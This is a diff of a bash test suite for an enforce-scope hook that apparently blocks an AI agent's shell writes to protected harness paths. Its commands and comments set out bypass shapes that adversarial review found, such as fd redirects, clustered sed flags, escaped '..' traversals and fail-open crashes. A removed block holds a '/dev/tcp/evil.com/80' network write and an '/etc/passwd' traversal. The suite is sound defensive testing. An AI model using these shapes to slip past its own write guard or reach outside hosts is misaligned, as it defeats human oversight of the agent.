-# never matched this shape at all, silently ALLOWING a real out-of-scope
+# never matched this shape at all, silently ALLOWING a real lead-owned
 # write. Whitespace or quoting between `>&` and the word doesn't change
 # bash's behavior, so all three shapes must be caught.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'echo HELLO >&src/other/out.txt')")
+  "$(bash_command_json 'echo HELLO >&.harness/mld/out.txt')")
 RC=$?
 assert_rc0 "$RC" "hs2 (F036): adjacent '>&word' file redirect exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F036): adjacent '>&word' denial uses JSON deny form"
-assert_contains "$OUT" "write to 'src/other/out.txt'" \
-  "hs2 (F036): adjacent '>&word' denial names the real target"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'echo HELLO >& src/other/out2.txt')")
+  "$(bash_command_json 'echo HELLO >& .harness/mld/out2.txt')")
 RC=$?
 assert_rc0 "$RC" "hs2 (F036): space-separated '>& word' file redirect exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F036): space-separated '>& word' denial uses JSON deny form"
-assert_contains "$OUT" "write to 'src/other/out2.txt'" \
-  "hs2 (F036): space-separated '>& word' denial names the real target"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "echo HELLO >&'src/other/out3.txt'")")
+  "$(bash_command_json "echo HELLO >&'.harness/mld/out3.txt'")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F036): quoted '>&'\''word'\''' file redirect exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F036): quoted '>&word' denial uses JSON deny form"
-assert_contains "$OUT" "write to 'src/other/out3.txt'" \
-  "hs2 (F036): quoted '>&word' denial names the real target"
 
-# No new false positive: an in-scope '>&word' target must still pass, and
+# No new false positive: an ordinary '>&word' target must still pass, and
 # the real fd-duplication forms (adjacent and space-separated digit/dash)
 # must remain unaffected -- confirmed against real bash that `>&1`/`>& 2`
 # are both still fd-duplication (no file written) even with the space.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'echo HELLO >&src/parser/out.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F036): an in-scope '>&word' target passes, rc 0"
+assert_rc0 "$RC" "hs2 (F036): an ordinary '>&word' target passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F036): in-scope '>&word' has no deny fields"
+  "hs2 (F036): ordinary '>&word' has no deny fields"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'echo HELLO >&1')")
 RC=$?
@@ -3908,16 +3773,14 @@ assert_not_contains "$OUT" "permissionDecision" \
 # extra token. Isolates this specifically: without the strip, this exact
 # command's denial names the MANGLED decoy text itself
 # (">&src/parser/decoy.txt", which happens to still deny only because it
-# doesn't match any real scope pattern -- coincidental, not a guarantee) --
-# the real target this hook must report is "src/other/f.txt", the actual
-# sed -i destination.
+# which is not lead-owned, so leaving it in place would let this command
+# through) -- the real target is ".harness/mld/f.txt", the actual sed -i
+# destination, and only finding THAT can produce the denial below.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'sed -i "s/a/b/" >&src/parser/decoy.txt src/other/f.txt')")
+  "$(bash_command_json 'sed -i "s/a/b/" >&src/parser/decoy.txt .harness/mld/f.txt')")
 RC=$?
 assert_rc0 "$RC" "hs2 (F036): mid-command '>&word' before a real sed target exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F036): mid-command '>&word' denial uses JSON deny form"
-assert_contains "$OUT" "write to 'src/other/f.txt'" \
-  "hs2 (F036): mid-command '>&word' denial names the real sed target, not the mangled decoy"
 
 # F036 round 2 (PR #63 round-1 review, findings N1/N2): an earlier version
 # claimed EVERY fd-prefixed '>&word' form (`2>&outfile.txt`) is a hard bash
@@ -3925,50 +3788,36 @@ assert_contains "$OUT" "write to 'src/other/f.txt'" \
 # `1>&outfile.txt` is a real, long-standing bash extension that genuinely
 # writes the file (confirmed against real bash and bash's own redir.c).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'echo HI 1>&src/other/out.txt')")
+  "$(bash_command_json 'echo HI 1>&.harness/mld/out.txt')")
 RC=$?
 assert_rc0 "$RC" "hs2 (F036 r2): fd=1-prefixed '1>&word' file redirect exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F036 r2): fd=1-prefixed '1>&word' denial uses JSON deny form"
-assert_contains "$OUT" "write to 'src/other/out.txt'" \
-  "hs2 (F036 r2): fd=1-prefixed '1>&word' denial names the real target"
 
 # N2: without FD_PREFIX on strip_redirects()'s new alternative, the leading
 # "1" survived unstripped as a bogus phantom argument, and the denial named
 # it ('1') instead of the real sed target -- the same failure mode the
 # plain mid-command test above exists to prevent, one fd prefix away.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'sed -i "s/a/b/" 1>&src/parser/decoy.txt src/other/f.txt')")
+  "$(bash_command_json 'sed -i "s/a/b/" 1>&src/parser/decoy.txt .harness/mld/f.txt')")
 RC=$?
 assert_rc0 "$RC" "hs2 (F036 r2): mid-command fd=1-prefixed '1>&word' exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F036 r2): mid-command fd=1-prefixed '1>&word' denial uses JSON deny form"
-assert_contains "$OUT" "write to 'src/other/f.txt'" \
-  "hs2 (F036 r2): mid-command fd=1-prefixed '1>&word' denial names the real target, not '1'"
 
 # N3: the fd-dup alternative's `(?:\d+|-)` is greedy but was unanchored, so
 # it could match just a PREFIX of a longer digit-LEADING word ('>&12abc' ->
 # stripped only '>&12', leaving 'abc' as a phantom argument). Real bash
 # genuinely writes to a file named "12abc" for `echo HI >&12abc` (confirmed
 # empirically) -- it is NOT purely digits, so it's a real file redirect,
-# not fd-duplication. The digits have to be the FIRST characters right
-# after ">&" to exercise the prefix-match bug at all, which under the
-# fixture's normal "src/parser/" scope pattern can never simultaneously be
-# an in-scope path (nothing starting with a digit matches "src/parser/") --
-# so this needs its own dedicated scope file ("12abc") that treats a
-# digit-leading path as in-scope, letting redirect_targets()'s own
-# (already-correct) detection of the redirect stay silent while isolating
-# whether strip_redirects() left a phantom "abc" leftover to confuse the
-# real (out-of-scope) sed target lookup that follows.
-DIR_HS_N3="$WORK/ht-scope-n3-digit-prefix"
-make_fixture "$DIR_HS_N3"
-install_hooks "$DIR_HS_N3"
-printf '12abc\n' > "$DIR_HS_N3/.claude/teammate-scope.txt"
-OUT=$(run_hook "$DIR_HS_N3" enforce-scope.sh \
-  "$(bash_command_json 'sed -i "s/a/b/" >&12abcXYZ src/other/f.txt')")
+# not fd-duplication. The dedicated "12abc" scope fixture this case used to
+# need (so a digit-leading path could count as in-scope) retired with OVI-144
+# Phase 3 along with scope patterns themselves: the redirect word is simply
+# not lead-owned, so redirect_targets()' own detection stays silent either way
+# and the real sed target after the phantom leftover is what has to be found.
+OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
+  "$(bash_command_json 'sed -i "s/a/b/" >&12abcXYZ .harness/mld/f.txt')")
 RC=$?
 assert_rc0 "$RC" "hs2 (F036 r2): mid-command '>&12abcXYZ' (digit-prefixed non-digit word) exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F036 r2): mid-command '>&12abcXYZ' denial uses JSON deny form"
-assert_contains "$OUT" "write to 'src/other/f.txt'" \
-  "hs2 (F036 r2): mid-command '>&12abcXYZ' denial names the real sed target, not a truncated leftover"
 
 # F037: sed_inplace_targets() recognized in-place mode only via a BARE "-i",
 # an attached-suffix "-i..." prefix, or an EXACT "--in-place" -- missing two
@@ -3977,39 +3826,33 @@ assert_contains "$OUT" "write to 'src/other/f.txt'" \
 # confirmed against real GNU sed (gsed 4.10): both genuinely enable
 # in-place editing with an empty suffix.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed -ri 's/a/b/' src/other/f.txt")")
+  "$(bash_command_json "sed -ri 's/a/b/' .harness/mld/f.txt")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F037): clustered '-ri' out-of-scope target exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F037): clustered '-ri' lead-owned target exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F037): clustered '-ri' denial uses JSON deny form"
-assert_contains "$OUT" "write to 'src/other/f.txt'" \
-  "hs2 (F037): clustered '-ri' denial names the real target"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed -ni 's/a/b/p' src/other/f.txt")")
+  "$(bash_command_json "sed -ni 's/a/b/p' .harness/mld/f.txt")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F037): clustered '-ni' out-of-scope target exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F037): clustered '-ni' lead-owned target exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F037): clustered '-ni' denial uses JSON deny form"
-assert_contains "$OUT" "write to 'src/other/f.txt'" \
-  "hs2 (F037): clustered '-ni' denial names the real target"
 
 # GNU's attached long-form suffix `--in-place=.bak` -- matches neither the
 # exact "--in-place" nor a "-i" prefix. Confirmed against real GNU sed: it
 # genuinely writes a backup with that suffix, same as `-i.bak`.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed --in-place=.bak 's/a/b/' src/other/f.txt")")
+  "$(bash_command_json "sed --in-place=.bak 's/a/b/' .harness/mld/f.txt")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F037): attached '--in-place=' out-of-scope target exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F037): attached '--in-place=' lead-owned target exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F037): attached '--in-place=' denial uses JSON deny form"
-assert_contains "$OUT" "write to 'src/other/f.txt'" \
-  "hs2 (F037): attached '--in-place=' denial names the real target"
 
-# No new false positive: an in-scope clustered '-ri' target must still pass.
+# No new false positive: an ordinary clustered '-ri' target must still pass.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json "sed -ri 's/a/b/' src/parser/f.txt")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F037): clustered '-ri' in-scope target passes, rc 0"
+assert_rc0 "$RC" "hs2 (F037): clustered '-ri' ordinary target passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F037): clustered '-ri' in-scope target has no deny fields"
+  "hs2 (F037): clustered '-ri' ordinary target has no deny fields"
 
 # F037 (round-4 review of PR #52, folded in here per that review's own
 # note): `sed -f -i.bak file` -- a real file literally named "-i.bak" used
@@ -4018,7 +3861,7 @@ assert_not_contains "$OUT" "permissionDecision" \
 # an ordinary read command that writes nothing (confirmed against real GNU
 # sed: prints to stdout, unmodified, no in-place edit happens at all).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'sed -f -i.bak src/other/f.txt')")
+  "$(bash_command_json 'sed -f -i.bak .harness/mld/f.txt')")
 RC=$?
 assert_rc0 "$RC" "hs2 (F037): 'sed -f -i.bak file' (a real -f value, not -i) passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
@@ -4032,32 +3875,26 @@ assert_not_contains "$OUT" "permissionDecision" \
 # is macOS, and this same function already accommodates a BSD idiom
 # elsewhere (the `-i ''` empty-suffix skip).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed -ai.bak 's/a/b/' src/other/f.txt")")
+  "$(bash_command_json "sed -ai.bak 's/a/b/' .harness/mld/f.txt")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F037 r1): BSD clustered '-ai' out-of-scope target exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F037 r1): BSD clustered '-ai' lead-owned target exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F037 r1): BSD clustered '-ai' denial uses JSON deny form"
-assert_contains "$OUT" "write to 'src/other/f.txt'" \
-  "hs2 (F037 r1): BSD clustered '-ai' denial names the real target"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed -Hi.bak 's/a/b/' src/other/f.txt")")
+  "$(bash_command_json "sed -Hi.bak 's/a/b/' .harness/mld/f.txt")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F037 r1): BSD clustered '-Hi' out-of-scope target exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F037 r1): BSD clustered '-Hi' lead-owned target exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F037 r1): BSD clustered '-Hi' denial uses JSON deny form"
-assert_contains "$OUT" "write to 'src/other/f.txt'" \
-  "hs2 (F037 r1): BSD clustered '-Hi' denial names the real target"
 
 # Pins the deliberate "l" trade-off itself (round-2 review, non-blocking nit
 # 1): without this assertion, a future narrowing of the class back to
 # excluding "l" (undoing the accepted GNU-side over-denial in exchange for
 # closing the BSD fail-open) would fail no test at all.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed -li.bak 's/a/b/' src/other/f.txt")")
+  "$(bash_command_json "sed -li.bak 's/a/b/' .harness/mld/f.txt")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F037 r1): BSD clustered '-li' out-of-scope target exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F037 r1): BSD clustered '-li' lead-owned target exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F037 r1): BSD clustered '-li' denial uses JSON deny form"
-assert_contains "$OUT" "write to 'src/other/f.txt'" \
-  "hs2 (F037 r1): BSD clustered '-li' denial names the real target"
 
 # Isolates the e/f exclusion from IN_PLACE_CLUSTER_PATTERN specifically --
 # without it, "-fi" would be misread as -f combined with -i, when real GNU
@@ -4072,7 +3909,7 @@ assert_contains "$OUT" "write to 'src/other/f.txt'" \
 # needed so a wrongly-triggered guard consumes the first as the fake
 # implicit script and then wrongly finds the SECOND as a real target.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'sed -fi src/parser/script_arg.txt src/other/f.txt')")
+  "$(bash_command_json 'sed -fi src/parser/script_arg.txt .harness/mld/f.txt')")
 RC=$?
 assert_rc0 "$RC" "hs2 (F037 r1): 'sed -fi FILE FILE' (a real -f value, not -i) passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
@@ -4081,75 +3918,33 @@ assert_not_contains "$OUT" "permissionDecision" \
 # Three-flag cluster and a quoted cluster -- both correct today, previously
 # unpinned by any assertion.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed -rni 's/a/b/p' src/other/f.txt")")
+  "$(bash_command_json "sed -rni 's/a/b/p' .harness/mld/f.txt")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F037 r1): three-flag cluster '-rni' out-of-scope target exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F037 r1): three-flag cluster '-rni' lead-owned target exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F037 r1): three-flag cluster '-rni' denial uses JSON deny form"
-assert_contains "$OUT" "write to 'src/other/f.txt'" \
-  "hs2 (F037 r1): three-flag cluster '-rni' denial names the real target"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'sed "-ri" '"'"'s/a/b/'"'"' src/other/f.txt')")
+  "$(bash_command_json 'sed "-ri" '"'"'s/a/b/'"'"' .harness/mld/f.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F037 r1): quoted cluster '\"-ri\"' out-of-scope target exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2 (F037 r1): quoted cluster '\"-ri\"' lead-owned target exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F037 r1): quoted cluster '\"-ri\"' denial uses JSON deny form"
-assert_contains "$OUT" "write to 'src/other/f.txt'" \
-  "hs2 (F037 r1): quoted cluster '\"-ri\"' denial names the real target"
 
 # A real background/AND '&' NOT glued to a '>' must still act as a segment
 # separator, unchanged from before.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'rm src/parser/a.txt & rm src/other/b.txt')")
+  "$(bash_command_json 'rm src/parser/a.txt & rm .harness/mld/b.txt')")
 RC=$?
 assert_rc0 "$RC" "hs2 (F030): a real background '&' still separates segments (JSON deny)"
-assert_deny_json "$OUT" "hs2 (F030): background-separated out-of-scope target still denied"
-assert_contains "$OUT" "src/other/b.txt" \
-  "hs2 (F030): background-separated denial names the real out-of-scope target"
+assert_deny_json "$OUT" "hs2 (F030): background-separated lead-owned target still denied"
 
-# Round-1 review: the original /dev/* exemption matched ANY path starting
-# with "/dev/", which also silently allowed /dev/shm/* (a real writable
-# tmpfs on Linux, where this template runs in CI) and bash's /dev/tcp
-# network-redirect extension (a live egress channel, not a device node) --
-# found by adversarial review of PR #53. Narrowed to an enumerated set of
-# ordinary character-device sinks plus /dev/fd/N; these two must now DENY.
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'echo x > /dev/shm/evil')")
-RC=$?
-assert_rc0 "$RC" "hs2 (F030): /dev/shm/* is no longer blanket-exempted (JSON deny)"
-assert_deny_json "$OUT" "hs2 (F030): /dev/shm/* denial uses JSON deny form"
-
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'echo x > /dev/tcp/evil.com/80')")
-RC=$?
-assert_rc0 "$RC" "hs2 (F030): /dev/tcp/* network redirect is no longer blanket-exempted (JSON deny)"
-assert_deny_json "$OUT" "hs2 (F030): /dev/tcp/* denial uses JSON deny form"
-
-# /dev/fd/N (bash's process-substitution/fd-as-path idiom) stays exempt,
-# matched by pattern since N is unbounded.
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'cat file 2>/dev/fd/3')")
-RC=$?
-assert_rc0 "$RC" "hs2 (F030): /dev/fd/N stays exempt, rc 0"
-assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F030): /dev/fd/N has no deny fields"
-
-# A /dev/../ traversal spelling resolves to a real out-of-scope path and is
-# denied. This does NOT pin normalize()'s traversal resolution on its own
-# (disabling normpath leaves this assertion passing, since both spellings
-# are out of scope anyway) -- it pins the CONJUNCTION that keeps the
-# exemption unlaunderable: exact-set/pattern membership AND normalize-
-# before-exemption ordering. Reverting either one alone leaves it green;
-# reverting both together fails it (found by adversarial review of PR #53,
-# round 3, correcting round 2's own comment on this same test).
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'echo x > /dev/../etc/passwd')")
-RC=$?
-assert_rc0 "$RC" "hs2 (F030): a /dev/../ traversal cannot launder a path into the /dev exemption, rc 0"
-assert_deny_json "$OUT" "hs2 (F030): /dev/../ traversal denial uses JSON deny form"
-
-# The exemption is an exact/pattern match, not a string-prefix match -- a
-# real path that merely starts with the same 4 characters must not be
-# confused with the /dev/ namespace.
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'echo x > /devious/evil.txt')")
-RC=$?
-assert_rc0 "$RC" "hs2 (F030): '/devious/...' is not confused with '/dev/' (JSON deny)"
-assert_deny_json "$OUT" "hs2 (F030): '/devious/...' denial uses JSON deny form"
+# The /dev/* write-target exemption itself retired with OVI-144 Phase 3: it
+# existed so the `cmd 2>/dev/null` idiom wouldn't be denied for failing to
+# match a scope pattern, and with only the lead-owned set left to match, no
+# /dev path can produce a denial in the first place. The cluster that pinned
+# its narrowing (/dev/shm and /dev/tcp denied, /dev/fd/N exempt, a /dev/../
+# traversal unable to launder a path into it, "/devious" not confused with
+# "/dev/") went with it -- every one of those cases is now simply an ordinary,
+# non-lead-owned path.
 
 # F031: unquote_token() strips quote characters from an extracted target but
 # never removes shell backslash-escapes, so a backslash-escaped ".." segment
@@ -4159,75 +3954,69 @@ assert_deny_json "$OUT" "hs2 (F030): '/devious/...' denial uses JSON deny form"
 # real bash strips the backslash and genuinely traverses out. Filed during
 # F026's review.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'echo x > src/parser/\../other/x.txt')")
+  "$(bash_command_json 'echo x > src/\../.harness/mld/x.txt')")
 RC=$?
 assert_rc0 "$RC" "hs2: a backslash-escaped '..'-traversal exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: backslash-escaped traversal denial uses JSON deny form"
-assert_contains "$OUT" "src/other/x.txt" \
-  "hs2: backslash-escaped traversal denial names the real, resolved out-of-scope path"
 
 # Not applicable to the Edit/Write/MultiEdit legacy path: file_path arrives as
 # a literal JSON string parameter, never shell-parsed, so a backslash
 # character in it is just part of the filename -- there is no shell to strip
 # it, unlike a Bash tool_input command string.
 
-# A backslash before an ordinary character elsewhere in an in-scope path
+# A backslash before an ordinary character elsewhere in an ordinary path
 # must not itself trigger a false denial -- only ".." segments matter.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'echo x > src/parser/\ok.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: a backslash-escaped ordinary character in an in-scope path passes, rc 0"
+assert_rc0 "$RC" "hs2: a backslash-escaped ordinary character in an ordinary path passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
   "hs2: backslash-escaped ordinary character has no deny fields"
 
 # A more discriminating case than the one above: this must ALLOW under the
-# correct fix (unescaping "\p" -> "p" yields "src/parser/ok.txt", in scope)
+# correct fix (unescaping "\p" -> "p" yields "src/parser/ok.txt", ordinary)
 # but DENY under both no-fix (the literal "\parser" segment never matches
 # the "src/parser/" prefix) and an over-broad delete-the-character mutant
-# (which would yield "src/arser/ok.txt", also out of scope) -- so, unlike
+# (which would yield "src/arser/ok.txt", also lead-owned) -- so, unlike
 # the case above, this one actually fails without the real fix.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'echo x > src/\parser/ok.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: an escaped-but-ordinary path segment resolves to its in-scope form, rc 0"
+assert_rc0 "$RC" "hs2: an escaped-but-ordinary path segment resolves to its ordinary form, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
   "hs2: escaped-but-ordinary path segment has no deny fields"
 
 # F033: unquote_token() stripped the $'...' ANSI-C-quote wrapper but never
 # decoded the escapes inside it, so a traversal segment spelled with a
 # hex/octal escape survived intact. Verified against real bash:
-# $'src/parser/\x2e\x2e/other/x.txt' really writes to src/other/x.txt
+# $'src/\x2e\x2e/.harness/mld/x.txt' really writes to .harness/mld/x.txt
 # (\x2e decodes to "." twice, giving ".."), a different mechanism from
 # F031 (escape DECODING inside $'...', not escape REMOVAL outside quotes).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "echo x > \$'src/parser/\x2e\x2e/other/x.txt'")")
+  "$(bash_command_json "echo x > \$'src/\x2e\x2e/.harness/mld/x.txt'")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F033): a hex-escaped '..'-traversal inside \$'...' exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F033): hex-escaped traversal denial uses JSON deny form"
-assert_contains "$OUT" "src/other/x.txt" \
-  "hs2 (F033): hex-escaped traversal denial names the real, resolved out-of-scope path"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "echo x > \$'src/parser/\056\056/other/x.txt'")")
+  "$(bash_command_json "echo x > \$'src/\056\056/.harness/mld/x.txt'")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F033): an octal-escaped '..'-traversal inside \$'...' exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F033): octal-escaped traversal denial uses JSON deny form"
-assert_contains "$OUT" "src/other/x.txt" \
-  "hs2 (F033): octal-escaped traversal denial names the real, resolved out-of-scope path"
 
-# No new false positive: an ordinary $'...' in-scope path (no escapes, or
+# No new false positive: an ordinary $'...' ordinary path (no escapes, or
 # an escape that decodes to an ordinary character) must still pass cleanly.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json "echo x > \$'src/parser/my file.txt'")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F033): an ordinary \$'...' in-scope path with a space passes, rc 0"
+assert_rc0 "$RC" "hs2 (F033): an ordinary \$'...' ordinary path with a space passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F033): ordinary \$'...' in-scope path has no deny fields"
+  "hs2 (F033): ordinary \$'...' ordinary path has no deny fields"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json "echo x > \$'src/parser/caf\x65.txt'")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F033): a hex-escaped ordinary character in an in-scope \$'...' path passes, rc 0"
+assert_rc0 "$RC" "hs2 (F033): a hex-escaped ordinary character in an ordinary \$'...' path passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
   "hs2 (F033): hex-escaped ordinary character has no deny fields"
 
@@ -4259,20 +4048,16 @@ assert_not_contains "$OUT" "permissionDecision" \
 # "." on bash 5.3.15, a live, not merely theoretical, bypass identical to
 # F033's own on any bash new enough.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "echo x > \$'src/parser/\u002e\u002e/other/x.txt'")")
+  "$(bash_command_json "echo x > \$'src/\u002e\u002e/.harness/mld/x.txt'")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F038): a \u-escaped '..'-traversal inside \$'...' exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F038): \u-escaped traversal denial uses JSON deny form"
-assert_contains "$OUT" "src/other/x.txt" \
-  "hs2 (F038): \u-escaped traversal denial names the real, resolved out-of-scope path"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "echo x > \$'src/parser/\U0000002e\U0000002e/other/x.txt'")")
+  "$(bash_command_json "echo x > \$'src/\U0000002e\U0000002e/.harness/mld/x.txt'")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F038): a \U-escaped '..'-traversal inside \$'...' exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F038): \U-escaped traversal denial uses JSON deny form"
-assert_contains "$OUT" "src/other/x.txt" \
-  "hs2 (F038): \U-escaped traversal denial names the real, resolved out-of-scope path"
 
 # \cX (control-char) decodes on both bash versions already -- verified
 # using `ord(X.upper()) & 0x1F`, not a naive "XOR 0x40" convention some
@@ -4281,20 +4066,20 @@ assert_contains "$OUT" "src/other/x.txt" \
 # produce a non-printable control byte (0x00-0x1F), never "." or "/", so
 # not independently traversal-exploitable -- this pins the decode itself,
 # not a security property: the control bytes survive into the target
-# string but the path stays in-scope (no traversal possible from them).
+# string but the path stays ordinary (no traversal possible from them).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json "echo x > \$'src/parser/\cA\cAtest.txt'")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F038): a \c-escaped in-scope path passes, rc 0"
+assert_rc0 "$RC" "hs2 (F038): a \c-escaped ordinary path passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F038): \c-escaped in-scope path has no deny fields (control bytes aren't traversal)"
+  "hs2 (F038): \c-escaped ordinary path has no deny fields (control bytes aren't traversal)"
 
 # No new false positive: an ordinary \u/\U escape decoding to a harmless
-# in-scope character must still pass cleanly.
+# ordinary character must still pass cleanly.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json "echo x > \$'src/parser/caf\u0065.txt'")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F038): a \u-escaped ordinary character in an in-scope \$'...' path passes, rc 0"
+assert_rc0 "$RC" "hs2 (F038): a \u-escaped ordinary character in an ordinary \$'...' path passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
   "hs2 (F038): \u-escaped ordinary character has no deny fields"
 
@@ -4306,7 +4091,7 @@ assert_not_contains "$OUT" "permissionDecision" \
 # json.dumps()/print() of the denial message DOES raise
 # (UnicodeEncodeError: surrogates not allowed) once a resolved path
 # contains one, and because this hook is fail-OPEN on any exception (an
-# empty DENY_REASON means deny_json() never runs), a PLAIN out-of-scope
+# empty DENY_REASON means deny_json() never runs), a PLAIN lead-owned
 # write with NO traversal at all -- just a lone surrogate escape anywhere
 # in the target -- silently bypassed detection entirely. Confirmed by
 # direct execution before the fix: rc 0, no deny fields, traceback on
@@ -4314,34 +4099,28 @@ assert_not_contains "$OUT" "permissionDecision" \
 # feature itself introduced, not a residual -- the most severe finding of
 # this feature's own review.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "echo x > \$'src/other/\ud800x.txt'")")
+  "$(bash_command_json "echo x > \$'.harness/mld/\ud800x.txt'")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F038 r2): a lone-surrogate \u escape exits 0 (JSON deny, not a crash)"
 assert_deny_json "$OUT" "hs2 (F038 r2): lone-surrogate denial uses JSON deny form"
-assert_contains "$OUT" "src/other/" \
-  "hs2 (F038 r2): lone-surrogate denial names the real out-of-scope target"
 
 # Composes with the pre-existing F031/F033 defenses too: a REAL ".."
 # traversal plus a trailing lone surrogate must still resolve and deny
 # correctly, not crash past the point where the real target was already
 # computed.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "echo x > \$'src/parser/../other/\ud800x.txt'")")
+  "$(bash_command_json "echo x > \$'src/../.harness/mld/\ud800x.txt'")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F038 r2): traversal plus a trailing lone surrogate exits 0 (JSON deny)"
